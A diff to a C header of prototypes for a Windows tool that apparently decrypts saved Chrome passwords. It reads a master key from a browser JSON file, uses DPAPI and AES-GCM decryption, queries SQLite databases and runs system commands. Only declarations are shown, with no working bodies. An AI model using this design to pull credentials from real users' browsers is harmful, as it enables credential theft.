@@ -6,7 +6,6 @@
 #include <sqlite3.h>
 #include <dpapi.h>
 #include <bcrypt.h>
-#include <ntstatus.h>
 #include <stdlib.h>
 
 #define BYTE_RESULT 100
@@ -18,16 +17,17 @@
 #define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
 #endif
 
-DWORD get_user_dir(GUID folder_id, PCWSTR browser_location, PWSTR buf_path, PSTR buf_outMsg, WORD buf_outSize);
+DWORD get_user_dir(GUID folder_id, PCWSTR browser_location, PWSTR buf_path, PSTR buf_outMsg, DWORD buf_outSize);
+BOOL get_json_property(PCWSTR browser_dir, PCWSTR data_file, PCWSTR property, PWCHAR enc_master_key, WORD enc_master_key_size, PSTR buf_outMsg, DWORD buf_outSize);
 BOOL dpapi_decrypt(BYTE* encrypted_data, DWORD size_encrypted_data, DATA_BLOB* decrypted_data);
 BOOL aesgcm_decrypt(BCRYPT_KEY_HANDLE handle_bcrypt, DWORD offset, BYTE* encrypted_password, int* size_encrypted_datablob, BYTE* iv, DWORD size_iv, BYTE* tag, DWORD size_tag, BYTE** decrypted_byte, PULONG decrypted_byte_size);
 BOOL base64_to_byte(PCHAR base64_string, BYTE** byte_string, PDWORD size_byte_string);
 BOOL checkSubtring(const WCHAR* substring, PWCHAR test_string);
-BOOL get_file_explorer(PWSTR chrome_dir, WIN32_FIND_DATAW* dir_files, HANDLE* dir_handle, PSTR buf_outMsg, WORD buf_outSize);
-BOOL open_database(PWSTR database_location, void** handle_db, PSTR buf_outMsg, WORD buf_outSize, BOOL open_copied_instance);
-int prepare_sql(void* handle_db, void** handle_sql_stmt, const char* sql_stmt, PSTR buf_outMsg, WORD buf_outSize);
+BOOL get_file_explorer(PWSTR chrome_dir, WIN32_FIND_DATAW* dir_files, HANDLE* dir_handle, PSTR buf_outMsg, DWORD buf_outSize);
+BOOL open_database(PWSTR database_location, void** handle_db, BOOL open_copied_instance, PSTR buf_outMsg, DWORD buf_outSize);
+int prepare_sql(void* handle_db, void** handle_sql_stmt, const char* sql_stmt, PSTR buf_outMsg, DWORD buf_outSize);
 BOOL iterate_result(void* handle_sql_stmt);
 void* get_result(void* handle_sql_stmt, int index, int type);
 int get_result_size(void* handle_sql_stmt, int index);
-BOOL close_database(void* handle_db, void* handle_sql_stmt, PSTR buf_outMsg, WORD buf_outSize);
+BOOL close_database(void* handle_db, void* handle_sql_stmt, PSTR buf_outMsg, DWORD buf_outSize);
 BOOL execute_system(LPCWSTR command);
